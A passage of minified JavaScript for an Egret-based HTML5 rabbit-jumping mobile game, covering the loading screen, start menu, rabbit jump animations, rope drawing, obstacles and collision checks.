e(){t.call(this),this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this)}return __extends(e,t),e.prototype.onAddToStage=function(t){this.urlloader=new egret.URLLoader,t=new egret.URLRequest,this.urlloader.dataFormat=egret.URLLoaderDataFormat.VARIABLES,t.url="",this.urlloader.load(t),this.urlloader.addEventListener(egret.Event.COMPLETE,this.onComplete,this)},e.prototype.onComplete=function(t){console.log(this.urlloader.data.toString())},e}(egret.DisplayObjectContainer);t.NetDemo=e,e.prototype.__class__="jump.NetDemo"}(jump||(jump={}));var __extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},LoadingUI=function(t){function e(){t.call(this),this.hint="萌萌跳跳兔加载中...\n 开始界面请在手指提示处划绳子\n 绳子越短兔子跳得越高\n \n 障碍物有树枝和天兵,你小心喽\n 高度越高风景越好,好东西都在后面\n 精彩即将开始...\n".split(" "),this.hint_index=0,this.createView()}return __extends(e,t),e.prototype.createView=function(){this.textField=new egret.TextField,this.addChild(this.textField),this.textField.y=300,this.textField.width=480,this.textField.height=100,this.textField.textAlign="center"},e.prototype.setProgress=function(t,e){t==e-1?this.hint_index=this.hint.length-1:(this.hint_index=t-1,this.hint_index%=this.hint.length),this.textField.text=this.hint[this.hint_index]+"加载中..."+t+"/"+e},e}(egret.Sprite);LoadingUI.prototype.__class__="LoadingUI",__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.remove_face,this)}return __extends(e,t),e.prototype.onAddToStage=function(){this.removeEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.init_title(),this.init_ranking(),this.init_hint(),this.init_sign(),this.init_hand()},e.prototype.init_title=function(){this.title=new egret.Bitmap(GameApp.other_sheet.getTexture("title")),this.title.anchorX=.5,this.title.x=this.stage.stageWidth/2,this.title.y=this.stage.stageHeight/5,this.addChild(this.title)},e.prototype.init_ranking=function(){this.ranking=new egret.Bitmap(GameApp.other_sheet.getTexture("ranking")),this.ranking.anchorX=.5,this.ranking.anchorY=.5,this.ranking.x=this.stage.stageWidth/2,this.ranking.y=27*this.stage.stageHeight/60,this.addChild(this.ranking),this.ranking.touchEnabled=!0,this.ranking.addEventListener(egret.TouchEvent.TOUCH_TAP,this.open_rangking,this)},e.prototype.open_rangking=function(){dp_Ranking()},e.prototype.back_face=function(){this.removeChildren(),this.init_title(),this.init_ranking(),this.init_hint(),this.init_sign(),this.init_hand()},e.prototype.init_hint=function(){this.hint=new egret.Bitmap(GameApp.other_sheet.getTexture("hint")),this.hint.anchorX=.5,this.hint.x=this.stage.stageWidth/2,this.hint.y=8*this.stage.stageHeight/15,this.addChild(this.hint)},e.prototype.init_sign=function(){this.sign=new egret.Bitmap(GameApp.other_sheet.getTexture("sign")),this.sign.anchorX=.5,this.sign.x=this.stage.stageWidth/2,this.sign.y=13*this.stage.stageHeight/15,this.sign.touchEnabled=!0,this.addChild(this.sign),this.sign.addEventListener(egret.TouchEvent.TOUCH_BEGIN,this.rm_face,this)},e.prototype.rm_face=function(){this.sign.removeEventListener(egret.TouchEvent.TOUCH_BEGIN,this.rm_face,this),this.dispatchEventWith("rmface")},e.prototype.init_hand=function(){this.hand=new egret.Bitmap(GameApp.other_sheet.getTexture("hand")),this.hand.x=this.stage.stageWidth/2-7*this.sign.width/16,this.hand.y=13*this.stage.stageHeight/15+this.sign.height/2,this.addChild(this.hand),this.hand.touchEnabled=!0,this.hand.addEventListener(egret.TouchEvent.TOUCH_BEGIN,this.rm_face,this),this.start_move()},e.prototype.getspeedOffset=function(){var t=egret.getTimer(),e=1e3/(t-this._lastTime);this._lastTime=t,this.speedOffset=60/e},e.prototype.start_move=function(){this.hand.addEventListener(egret.Event.ENTER_FRAME,this.hand_move,this)},e.prototype.stop_move=function(){this.hand.removeEventListener(egret.Event.ENTER_FRAME,this.hand_move,this),this.hand.removeEventListener(egret.Event.ENTER_FRAME,this.hand_move_2,this)},e.prototype.hand_move=function(){this.hand.x>=this.stage.stageWidth/2+3*this.sign.width/8?(this.hand.removeEventListener(egret.Event.ENTER_FRAME,this.hand_move,this),this.hand.addEventListener(egret.Event.ENTER_FRAME,this.hand_move_2,this)):this.hand.x+=8},e.prototype.hand_move_2=function(){this.hand.x<=this.stage.stageWidth/2-7*this.sign.width/16?(this.hand.removeEventListener(egret.Event.ENTER_FRAME,this.hand_move_2,this),this.hand.addEventListener(egret.Event.ENTER_FRAME,this.hand_move,this)):this.hand.x-=8},e.prototype.remove_face=function(){this.stop_move(),this.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.remove_face,this),this.ranking.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.open_rangking,this),this.hand.removeEventListener(egret.Event.ENTER_FRAME,this.hand_move,this),this.sign.removeEventListener(egret.TouchEvent.TOUCH_BEGIN,this.rm_face,this)},e}(egret.DisplayObjectContainer);t.StartFace=e,e.prototype.__class__="jump.StartFace"}(jump||(jump={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this.have_tree=!1,this.winwidth=egret.MainContext.instance.stage.stageWidth,this.winheight=egret.MainContext.instance.stage.stageHeight,this.is_out=!1,this.init_trees()}return __extends(e,t),e.prototype.init_trees=function(){this.trees_texture=[],this.trees_texture[0]=GameApp.cloud_tree_line_sheet.getTexture("tree0"),this.trees_texture[1]=GameApp.cloud_tree_line_sheet.getTexture("tree-0"),this.trees_texture[2]=GameApp.cloud_tree_line_sheet.getTexture("tree1"),this.trees_texture[3]=GameApp.cloud_tree_line_sheet.getTexture("tree-1"),this.trees=[];for(var t=0;6>t;t++){var e=Math.max(Math.ceil(4*Math.random())-1,0),i=new egret.Bitmap(this.trees_texture[e]);i.x=0==e||2==e?-10:this.winwidth-i.width+15,i.y=0-i.height,this.addChild(i),this.trees.push(i)}},e.prototype.out_screen=function(){this.is_out=this.trees[0].y>this.winheight},e}(egret.DisplayObjectContainer);t.Tree=e,e.prototype.__class__="jump.Tree"}(jump||(jump={}));var __extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},GameApp=function(t){function e(){t.call(this),this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this)}return __extends(e,t),e.prototype.onAddToStage=function(t){this.loadingView=new LoadingUI,this.stage.addChild(this.loadingView),RES.addEventListener(RES.ResourceEvent.CONFIG_COMPLETE,this.onConfigComplete,this),RES.loadConfig("resource/resource.json","resource/")},e.prototype.onConfigComplete=function(t){RES.removeEventListener(RES.ResourceEvent.CONFIG_COMPLETE,this.onConfigComplete,this),RES.addEventListener(RES.ResourceEvent.GROUP_COMPLETE,this.onResourceLoadComplete,this),RES.addEventListener(RES.ResourceEvent.GROUP_PROGRESS,this.onResourceProgress,this),RES.loadGroup("preload")},e.prototype.onResourceLoadComplete=function(t){"preload"==t.groupName&&(this.stage.removeChild(this.loadingView),RES.removeEventListener(RES.ResourceEvent.GROUP_COMPLETE,this.onResourceLoadComplete,this),RES.removeEventListener(RES.ResourceEvent.GROUP_PROGRESS,this.onResourceProgress,this),e.bigmap_sheet=RES.getRes("bigmap_json"),e.cloud_tree_line_sheet=RES.getRes("cloud_tree_line_json"),e.enemy_sprint_json=RES.getRes("enemy_sprint_json"),e.other_sheet=RES.getRes("other_json"),e.dead_json_sheet=RES.getRes("dead_json"),e.drop_json_sheet=RES.getRes("drop_json"),e.original_json_sheet=RES.getRes("original_json"),e.roll_json_sheet=RES.getRes("roll_json"),e.vjump_json_sheet=RES.getRes("vjump_json"),e.skew_json_sheet=RES.getRes("skew_json"),e.sprint_json_sheet=RES.getRes("sprint_json"),t=new jump.GameContainer,this.addChild(t),egret.Profiler.getInstance().run())},e.prototype.web_net=function(){this.test_net=new jump.NetDemo,this.addChild(this.test_net)},e.prototype.onResourceProgress=function(t){"preload"==t.groupName&&this.loadingView.setProgress(t.itemsLoaded,t.itemsTotal)},e}(egret.DisplayObjectContainer);GameApp.prototype.__class__="GameApp",__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(e){t.call(this),this.is_out=!1,this.cloud_speed=0,this.texture=e,this.addEventListener(egret.Event.ADDED_TO_STAGE,this.set_xy,this)}return __extends(e,t),e.prototype.set_xy=function(){this.removeEventListener(egret.Event.ADDED_TO_STAGE,this.set_xy,this),this.anchorX=.5,this.x=Math.ceil(Math.random()*this.stage.stageWidth)},e.prototype.out_screen=function(){this.y>egret.MainContext.instance.stage.stageHeight&&(this.is_out=!0)},e.prototype.set_speed=function(t){this.cloud_speed=t},e.prototype.cloud_run=function(){this.y=this.y+this.cloud_speed+.5,this.cloud_speed=0,this.out_screen()},e}(egret.Bitmap);t.Cloud=e,e.prototype.__class__="jump.Cloud"}(jump||(jump={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.is_hitwall=!1,this.sprint_index=this.left_right=0,this.hight_best=egret.MainContext.instance.stage.stageHeight/8*3,this.stage_hight=egret.MainContext.instance.stage.stageHeight,this.i=1,this.hit_wall_index=0,this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this)}return __extends(i,e),i.prototype.onAddToStage=function(t){this.leader_state=1,this.bmp=new egret.Bitmap(GameApp.original_json_sheet.getTexture("original6")),this.stageW=egret.MainContext.instance.stage.stageWidth,this.stageH=egret.MainContext.instance.stage.stageHeight,this.bmp.anchorX=.5,this.bmp.anchorY=.5,this.bmp.scaleX=2/3,this.bmp.scaleY=2/3,this.bmp.x=this.stageW/2,this.bmp.y=this.stageH-this.bmp.height/2/2-300-10,this.v=this.stage_hight/800*5,this.reduce_v=.4*this.stage_hight/800,this.ang=90,this.up_down=1,this.index=0,this.addChild(this.bmp),this.addEventListener(egret.Event.ENTER_FRAME,this.init_run,this),this.init_wave()},i.prototype.init_wave=function(){this.sprint_bmp=new egret.Bitmap,this.addChild(this.sprint_bmp),this.sprint_bmp.anchorX=.5,this.sprint_bmp.anchorY=.5,this.sprint_bmp.scaleX=2/3,this.sprint_bmp.scaleY=2/3,this.sprint_bmp.visible=!1},i.prototype.sprint_wave=function(){switch(this.sprint_index%=24,this.sprint_index){case 0:this.sprint_bmp.texture=GameApp.enemy_sprint_json.getTexture("shockwave1");break;case 6:this.sprint_bmp.texture=GameApp.enemy_sprint_json.getTexture("shockwave2");break;case 12:this.sprint_bmp.texture=GameApp.enemy_sprint_json.getTexture("shockwave3");break;case 18:this.sprint_bmp.texture=GameApp.enemy_sprint_json.getTexture("shockwave4")}this.sprint_bmp.x=this.bmp.x,this.sprint_bmp.y=this.bmp.y,this.sprint_bmp.visible=!0,this.sprint_index++},i.prototype.play_wave=function(){this.addEventListener(egret.Event.ENTER_FRAME,this.sprint_wave,this)},i.prototype.stop_wave=function(){this.removeEventListener(egret.Event.ENTER_FRAME,this.sprint_wave,this),this.sprint_bmp.visible=!1},i.prototype.getspeedOffset=function(){var t=egret.getTimer(),e=1e3/(t-this._lastTime);this._lastTime=t,this.speedOffset=60/e},i.prototype.init_run=function(e){if(1==this.leader_state)this.bmp.y<=this.stage_hight-this.bmp.height/2/2-this.hight_best-10&&2!=this.up_down&&(this.up_down=2,this.v=5*this.stage_hight/800,this.reduce_v=.4*this.stage_hight/800,this.ang=90,this.bmp.texture=GameApp.original_json_sheet.getTexture("original6")),this.bmp.y>=this.stage_hight-this.bmp.height/2/2-10&&1!=this.up_down&&(this.up_down=1,this.v=18*this.stage_hight/800,this.reduce_v=-.4*this.stage_hight/800,this.ang=-90,this.bmp.texture=GameApp.original_json_sheet.getTexture("original10")),1==this.up_down?this.bmp.y<=this.stageH-this.bmp.height/2/2-9*this.hight_best/10?this.bmp.texture=GameApp.original_json_sheet.getTexture("original5"):this.bmp.y<=this.stageH-this.bmp.height/2/2-8*this.hight_best/10?this.bmp.texture=GameApp.original_json_sheet.getTexture("original4"):this.bmp.y<=this.stageH-this.bmp.height/2/2&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original1-3")):2==this.up_down&&this.bmp.y>=this.stageH-this.bmp.height/2/2-this.hight_best-3&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original7-9")),this.v+=this.reduce_v,this.bmp.y+=this.v*Math.sin(this.ang/180*Math.PI);else if(2==this.leader_state){if(0==this.up_down&&(this.up_down=1),1==this.up_down)if(this.is_hitwall)this.roll(),19==this.hit_wall_index&&(this.is_hitwall=!1),this.stop_wave(),t.GameContainer.is_sprint=!1;else if(this.v>2*t.GameContainer.wave_v/3&&1==t.GameContainer.is_sprint?this.play_wave():this.v<t.GameContainer.wave_v/3&&this.stop_wave(),1==this.left_right){if(this.v<t.GameContainer.ov-3*t.GameContainer.speed_reduce){if(2==t.GameContainer.rise_state)switch(e=1,this.index%=8*e,this.index){case 0*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint1");break;case 1*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint2");break;case 2*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint3");break;case 3*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint4");break;case 4*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint5");break;case 5*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint6");break;case 6*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint7");break;case 7*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint8")}else if(this.i=Math.max(Math.ceil((t.GameContainer.ov-this.v)/8),2),this.index%=4*this.i,1==t.GameContainer.rise_state)switch(this.index){case 0*this.i:this.bmp.texture=GameApp.vjump_json_sheet.getTexture("vjump-1");break;case 1*this.i:this.bmp.texture=GameApp.vjump_json_sheet.getTexture("vjump-2");break;case 2*this.i:this.bmp.texture=GameApp.vjump_json_sheet.getTexture("vjump-3");break;case 3*this.i:this.bmp.texture=GameApp.vjump_json_sheet.getTexture("vjump-4")}else switch(this.index){case 0*this.i:this.bmp.texture=GameApp.skew_json_sheet.getTexture("skewjump-1");break;case 1*this.i:this.bmp.texture=GameApp.skew_json_sheet.getTexture("skewjump-2");break;case 2*this.i:this.bmp.texture=GameApp.skew_json_sheet.getTexture("skewjump-3");break;case 3*this.i:this.bmp.texture=GameApp.skew_json_sheet.getTexture("skewjump-4")}this.index++}this.v<29*t.GameContainer.speed_reduce&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original-1-3")),this.v<21*t.GameContainer.speed_reduce&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original-4")),this.v<13*t.GameContainer.speed_reduce&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original-5")),this.v<5*t.GameContainer.speed_reduce&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original-6"))}else{if(this.v<t.GameContainer.ov-3*t.GameContainer.speed_reduce){if(2==t.GameContainer.rise_state)switch(e=1,this.index%=8*e,this.index){case 0*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint1");break;case 1*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint2");break;case 2*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint3");break;case 3*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint4");break;case 4*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint5");break;case 5*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint6");break;case 6*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint7");break;case 7*e:this.bmp.texture=GameApp.sprint_json_sheet.getTexture("sprint8")}else if(this.i=Math.max(Math.ceil((t.GameContainer.ov-this.v)/8),2),this.index%=4*this.i,-1==t.GameContainer.rise_state)switch(this.index){case 0*this.i:this.bmp.texture=GameApp.vjump_json_sheet.getTexture("vjump1");break;case 1*this.i:this.bmp.texture=GameApp.vjump_json_sheet.getTexture("vjump2");break;case 2*this.i:this.bmp.texture=GameApp.vjump_json_sheet.getTexture("vjump3");break;case 3*this.i:this.bmp.texture=GameApp.vjump_json_sheet.getTexture("vjump4")}else switch(this.index){case 0*this.i:this.bmp.texture=GameApp.skew_json_sheet.getTexture("skewjump1");break;case 1*this.i:this.bmp.texture=GameApp.skew_json_sheet.getTexture("skewjump2");break;case 2*this.i:this.bmp.texture=GameApp.skew_json_sheet.getTexture("skewjump3");break;case 3*this.i:this.bmp.texture=GameApp.skew_json_sheet.getTexture("skewjump4")}this.index++}this.v<29*t.GameContainer.speed_reduce&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original1-3")),this.v<21*t.GameContainer.speed_reduce&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original4")),this.v<13*t.GameContainer.speed_reduce&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original5")),this.v<5*t.GameContainer.speed_reduce&&(this.bmp.texture=GameApp.original_json_sheet.getTexture("original6"))}if(2==this.up_down&&(this.v+=.5,0<this.v)){if(this.i=Math.max(Math.ceil((t.GameContainer.ov-this.v)/8),15),this.index%=4*this.i,1==this.left_right)switch(this.index){case 0*this.i:this.bmp.texture=GameApp.drop_json_sheet.getTexture("drop-1");break;case 1*this.i:this.bmp.texture=GameApp.drop_json_sheet.getTexture("drop-2");break;case 2*this.i:this.bmp.texture=GameApp.drop_json_sheet.getTexture("drop-3");break;case 3*this.i:this.bmp.texture=GameApp.drop_json_sheet.getTexture("drop-2")}else switch(this.index){case 0*this.i:this.bmp.texture=GameApp.drop_json_sheet.getTexture("drop1");break;case 1*this.i:this.bmp.texture=GameApp.drop_json_sheet.getTexture("drop2");break;case 2*this.i:this.bmp.texture=GameApp.drop_json_sheet.getTexture("drop3");break;case 3*this.i:this.bmp.texture=GameApp.drop_json_sheet.getTexture("drop2")}this.index++}this.bmp.x>this.stageW-this.bmp.width/4&&2!=this.left_right&&(t.GameContainer.rise_state=0-t.GameContainer.rise_state,this.is_hitwall=!0,this.left_right=2,this.ang=180-this.ang),this.bmp.x<this.bmp.width/4&&1!=this.left_right&&(t.GameContainer.rise_state=0-t.GameContainer.rise_state,this.is_hitwall=!0,this.left_right=1,this.ang=180-this.ang),this.bmp.x+=this.v*Math.cos(this.ang/180*Math.PI),this.bg_is_run||(this.bmp.y+=this.v*Math.sin(this.ang/180*Math.PI))}else{if(this.stop_wave(),t.GameContainer.is_sprint=!1,this.index%=20,1==this.left_right)switch(this.index){case 0:this.bmp.texture=GameApp.dead_json_sheet.getTexture("dead1");break;case 5:this.bmp.texture=GameApp.dead_json_sheet.getTexture("dead2");break;case 10:this.bmp.texture=GameApp.dead_json_sheet.getTexture("dead3");break;case 15:this.bmp.texture=GameApp.dead_json_sheet.getTexture("dead4")}else switch(this.index){case 0:this.bmp.texture=GameApp.dead_json_sheet.getTexture("dead-1");break;case 5:this.bmp.texture=GameApp.dead_json_sheet.getTexture("dead-2");break;case 10:this.bmp.texture=GameApp.dead_json_sheet.getTexture("dead-3");break;case 15:this.bmp.texture=GameApp.dead_json_sheet.getTexture("dead-4")}this.bmp.y+=10,this.index++}this.bmp.y>this.stageH+this.bmp.height&&(this.removeEventListener(egret.Event.ENTER_FRAME,this.init_run,this),this.stop_wave(),this.dispatchEventWith("GAMEOVER"))},i.prototype.roll=function(){if(this.hit_wall_index%=19,1==this.left_right)switch(this.hit_wall_index){case 0:this.bmp.texture=GameApp.roll_json_sheet.getTexture("roll1");break;case 5:this.bmp.texture=GameApp.roll_json_sheet.getTexture("roll2");break;case 10:this.bmp.texture=GameApp.roll_json_sheet.getTexture("roll3");break;case 15:this.bmp.texture=GameApp.roll_json_sheet.getTexture("roll4")}else switch(this.hit_wall_index){case 0:this.bmp.texture=GameApp.roll_json_sheet.getTexture("roll-1");break;case 5:this.bmp.texture=GameApp.roll_json_sheet.getTexture("roll-2");break;case 10:this.bmp.texture=GameApp.roll_json_sheet.getTexture("roll-3");break;case 15:this.bmp.texture=GameApp.roll_json_sheet.getTexture("roll-4")}this.hit_wall_index++},i}(egret.DisplayObjectContainer);t.Leader=e,e.prototype.__class__="jump.Leader"}(jump||(jump={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.winwidth=egret.MainContext.instance.stage.stageWidth,this.winheight=egret.MainContext.instance.stage.stageHeight,this.line_sound=!1,this.temp_r=0,this.a_run=1,this.timer=new egret.Timer(200,1),this.timer1=new egret.Timer(10,1),this.tree_index=this.enemy_num=0,this.launcher_h=2*this.winheight/5,this.launcher_v=2*this.winheight/25,this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this)}return __extends(i,e),i.prototype.onAddToStage=function(){this.removeEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.createGameScene()},i.prototype.createGameScene=function(){this.bg=new t.BgMap,this.addChild(this.bg),this.enemy=[],this.addEventListener(egret.Event.ENTER_FRAME,this.remove_enemy,this),this.tree=new t.Tree,this.addChild(this.tree),this.leader=new t.Leader,this.addChild(this.leader),t.GameContainer.get_wave_v(),this.init_start_face(),this.init_line(),this.score=new t.Score},i.prototype.init_line=function(){this.line=new egret.Bitmap,this.line.anchorY=.5,this.line.visible=!1,this.addChild(this.line),this.rp=new egret.Bitmap(GameApp.cloud_tree_line_sheet.getTexture("p")),this.lp=new egret.Bitmap(GameApp.cloud_tree_line_sheet.getTexture("p")),this.rp.anchorX=.5,this.rp.anchorY=.5,this.rp.scaleX=.5,this.rp.scaleY=.5,this.lp.anchorX=.5,this.lp.anchorY=.5,this.lp.scaleX=.5,this.lp.scaleY=.5,this.rp.visible=!1,this.lp.visible=!1,this.addChild(this.rp),this.addChild(this.lp)},i.prototype.draw_line=function(e){e.type==egret.TouchEvent.TOUCH_BEGIN&&(this.removeEventListener(egret.Event.ENTER_FRAME,this.lx_hitTest,this),this.line.texture=GameApp.cloud_tree_line_sheet.getTexture("line1"),this.line.x=e.stageX,this.line.y=e.stageY,this.lp.x=e.stageX,this.lp.y=e.stageY,this.lp.visible=!0,this.rp.visible=!1,this.line.scaleX=0,this.line.visible=!0,this.addEventListener(egret.TouchEvent.TOUCH_MOVE,this.draw_line,this)),e.type==egret.TouchEvent.TOUCH_MOVE&&(this.temp_r=Math.sqrt((e.stageX-this.line.x)*(e.stageX-this.line.x)+(e.stageY-this.line.y)*(e.stageY-this.line.y)),this.line.rotation=180/Math.PI*Math.atan2(e.stageY-this.line.y,e.stageX-this.line.x),this.temp_r<this.winwidth/2?(this.rp.x=e.stageX,this.rp.y=e.stageY):(this.temp_r=this.winwidth/2,this.rp.x=this.line.x+this.temp_r*Math.cos(this.line.rotation/180*Math.PI),this.rp.y=this.line.y+this.temp_r*Math.sin(this.line.rotation/180*Math.PI)),this.line.scaleX=this.temp_r/this.line.width,this.rp.visible=!0),e.type==egret.TouchEvent.TOUCH_END&&(this.removeEventListener(egret.TouchEvent.TOUCH_MOVE,this.draw_line,this),0<this.temp_r&&(e=1/Math.ceil(20*this.temp_r/egret.MainContext.instance.stage.stageHeight)*egret.MainContext.instance.stage.stageHeight*3.5,t.GameContainer.ov=this.f_run(e),e>.75*egret.MainContext.instance.stage.stageHeight&&(t.GameContainer.is_sprint=!0),t.GameContainer.speed_reduce=this.a_run,this.addEventListener(egret.Event.ENTER_FRAME,this.lx_hitTest,this)))},i.get_wave_v=function(){var e=Math.sqrt(1/Math.ceil(20/egret.MainContext.instance.stage.stageHeight)*2*egret.MainContext.instance.stage.stageHeight*3.5);t.GameContainer.wave_v=e},i.prototype.f_run=function(t){return Math.sqrt(2*this.a_run*t)},i.prototype.f_v=function(t){return t-this.a_run},i.prototype.lx_hitTest=function(e){3!=this.leader.leader_state&&2==this.leader.up_down&&this.line.hitTestPoint(this.leader.bmp.x,this.leader.bmp.y+9*this.leader.bmp.height/60)&&(this.removeEventListener(egret.Event.ENTER_FRAME,this.lx_hitTest,this),this.leader.removeEventListener(egret.Event.ENTER_FRAME,this.leader.init_run,this.leader),this.leader.up_down=0,this.lp.x>this.rp.x&&(this.line.x=this.rp.x,this.line.y=this.rp.y,this.line.rotation=180/Math.PI*Math.atan2(this.lp.y-this.rp.y,this.lp.x-this.rp.x)),this.line.texture=GameApp.cloud_tree_line_sheet.getTexture("line2"),this.line.anchorY=.125,this.leader.bmp.texture=1==this.leader.left_right?GameApp.drop_json_sheet.getTexture("groundmoment-"):GameApp.drop_json_sheet.getTexture("groundmoment"),this.timer.addEventListener(egret.TimerEvent.TIMER_COMPLETE,this.stop_moment,this),this.timer.reset(),this.timer.start(),this.leader.leader_state=2,this.leader.left_right=0,this.leader.v=t.GameContainer.ov,this.leader.ang=this.line.rotation-90,0<Math.cos(this.leader.ang/180*Math.PI)?(this.leader.left_right=1,-60>this.leader.ang?(t.GameContainer.rise_state=1,-90==this.leader.ang&&(t.GameContainer.rise_state=2)):t.GameContainer.rise_state=0):(this.leader.left_right=2,-120<this.leader.ang?(t.GameContainer.rise_state=-1,-90==this.leader.ang&&(t.GameContainer.rise_state=2)):t.GameContainer.rise_state=0))},i.prototype.bg_run=function(e){if(2==this.leader.leader_state&&1==this.leader.up_down){if(this.leader.bmp.y<this.winheight/2)if(this.bg.speed=0-this.leader.v*Math.sin(this.leader.ang/180*Math.PI),0<this.bg.speed){for(this.bg.start(),this.score.showScore(this.bg.get_score()),this.line.y+=this.bg.speed,this.lp.y+=this.bg.speed,this.rp.y+=this.bg.speed,15>this.bg.speed&&(this.creat_tree(),this.creat_enemy()),this.tree.have_tree&&0<this.tree.trees.length?this.tree.trees[0].y+=this.bg.speed:this.tree.have_tree=!1,e=0;e<this.enemy.length;e++){var i=this.enemy[e];i.y<this.winheight/2+i.height/2?i.y_move(this.bg.speed):i.y_move(2.5*this.bg.speed)}this.leader.bg_is_run=!0,this.jumpheight=(this.bg.speed+this.leader.v*Math.sin(this.leader.ang/180*Math.PI))/2}else this.bg.speed=0,this.bg.pause(),this.leader.bg_is_run=!1;0>=this.leader.v&&(this.leader.leader_state=2,this.leader.up_down=2,this.leader.bmp.texture=1==this.leader.left_right?GameApp.original_json_sheet.getTexture("original-7-9"):GameApp.original_json_sheet.getTexture("original7-9"),this.leader.ang=90),this.leader.v-=t.GameContainer.speed_reduce}3==this.leader.leader_state&&this.bg.pause()},i.prototype.stop_moment=function(t){this.timer.removeEventListener(egret.TimerEvent.TIMER_COMPLETE,this.stop_moment,this),this.addChild(this.score),this.line.texture=GameApp.cloud_tree_line_sheet.getTexture("line3"),this.line.anchorY=.75,this.leader.bmp.texture=1==this.leader.left_right?GameApp.vjump_json_sheet.getTexture("vjump-1"):GameApp.vjump_json_sheet.getTexture("vjump1"),this.leader.addEventListener(egret.Event.ENTER_FRAME,this.leader.init_run,this.leader),this.addEventListener(egret.Event.ENTER_FRAME,this.bg_run,this),this.timer1.addEventListener(egret.TimerEvent.TIMER_COMPLETE,this.remove_line,this),this.timer1.reset(),this.timer1.start()},i.prototype.remove_line=function(t){this.timer1.removeEventListener(egret.TimerEvent.TIMER_COMPLETE,this.remove_line,this),this.line.visible=!1,this.rp.visible=!1,this.lp.visible=!1},i.prototype.enemy_hit_leader=function(){var t=new egret.Rectangle,e=new egret.Rectangle;t.x=this.leader.bmp.x-this.leader.width/4,t.y=this.leader.bmp.y-this.leader.height/4,t.width=this.leader.width/2,t.height=this.leader.height/2;for(var i=0;i<this.enemy.length;i++){var n=this.enemy[i];e.x=n.x-2*n.width/9,e.y=n.y-2*n.height/9,e.width=4*n.width/9,e.height=4*n.height/9,this.myintersects(t.x,t.y,t.width,t.height,e.x,e.y,e.width,e.height)&&(this.leader.leader_state=3)}},i.prototype.myintersects=function(t,e,i,n,r,s,o,a){return t+i>r&&t<r+o&&e+n>s&&e<s+a},i.prototype.creat_enemy=function(){if(0>=this.enemy.length){var e=this.bg.get_score();for(120<=e&&200>e?(t.Enemy.speed=.5,this.enemy_num=1):200<=e&&300>e?(t.Enemy.speed=.8,this.enemy_num=Math.ceil(2*Math.random())):300<=e&&500>e?(t.Enemy.speed=1.2,this.enemy_num=1+Math.ceil(2*Math.random())):500<=e&&(t.Enemy.speed=1.5,this.enemy_num=1+Math.ceil(2*Math.random())),e=0;e<this.enemy_num;e++){var i=new t.Enemy;this.enemy.push(i),i.y=0-i.height/3-2*i.height/3*e,this.addChildAt(i,1)}}},i.prototype.remove_enemy=function(t){if(0<this.tree.trees.length&&this.hit_left_tree(),0<this.enemy.length)for(this.enemy_hit_leader(),t=0;t<this.enemy.length;t++){var e=this.enemy[t];e.y>this.winheight+e.height/2&&(this.removeChild(e),this.enemy.shift())}},i.prototype.hit_left_tree=function(){var t=new egret.Rectangle,e=new 